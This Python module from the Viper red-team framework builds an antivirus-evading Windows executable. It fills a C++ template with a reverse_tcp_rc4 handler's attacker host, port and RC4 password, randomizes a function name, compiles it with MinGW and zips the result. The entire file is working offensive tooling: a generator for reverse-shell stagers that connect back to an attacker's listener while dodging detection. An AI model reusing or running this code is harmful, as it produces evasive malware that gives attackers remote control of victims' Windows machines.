# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


import time

from Lib.ModuleAPI import *


class PostModule(PostPythonModule):
    NAME_ZH = "REVERSE_TCP_RC4直连免杀"
    DESC_ZH = "模块采用直连监听,读取stager2的方式进行免杀"

    NAME_EN = "REVERSE_TCP_RC4 direct connection to bypass AV"
    DESC_EN = "The module adopts direct connection to handler and reads stager2 to bypass AV"

    MODULETYPE = TAG2TYPE.Execution
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/wh4gbm"]
    REFERENCES = [""]
    AUTHOR = ["Viper"]

    OPTIONS = register_options([
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        payload = self.get_handler_payload()
        if "windows" not in payload:
            return False, "选择handler错误,请选择windows平台的监听", "Select the handler error, please select the handler of the windows platform"
        if "reverse_tcp_rc4" not in payload:
            return False, "模块只支持reverse_tcp_rc4载荷", "The module only supports reverse_tcp_rc4 payload"
        return True, None

    def run(self):
        handler_config = self.get_handler_config()
        LHOST = handler_config.get("LHOST")
        LPORT = handler_config.get("LPORT")
        PASSWORD = handler_config.get("RC4PASSWORD")
        FUNCTION = self.random_str(10)
        source_code = self.generate_context_by_template(filename="main.cpp", LHOST=LHOST, LPORT=LPORT,
                                                        PASSWORD=PASSWORD, FUNCTION=FUNCTION)
        mingw = Mingw(include_dir=self.module_data_dir, source_code=source_code)
        payload = self.get_handler_payload()
        if "x64" not in payload:
            arch = "x86"
        else:
            arch = "x64"
        binbytes = mingw.compile_cpp(arch=arch, extra_params=["-lws2_32", "-lwininet"])

        exefilename = f"Reverse_TCP_RC4_{int(time.time())}.exe"
        projectfilename = f"Reverse_TCP_RC4_{int(time.time())}.zip"
        self.write_zip_vs_project(filename=projectfilename, source_code=source_code, exe_file=exefilename,
                                  exe_data=binbytes)

        self.log_info("模块执行完成", "Module operation completed")
        self.log_good(f"请在<文件列表>中查看生成的zip文件: {projectfilename}",
                      f"Please check the generated zip file in <Files>: {projectfilename}")
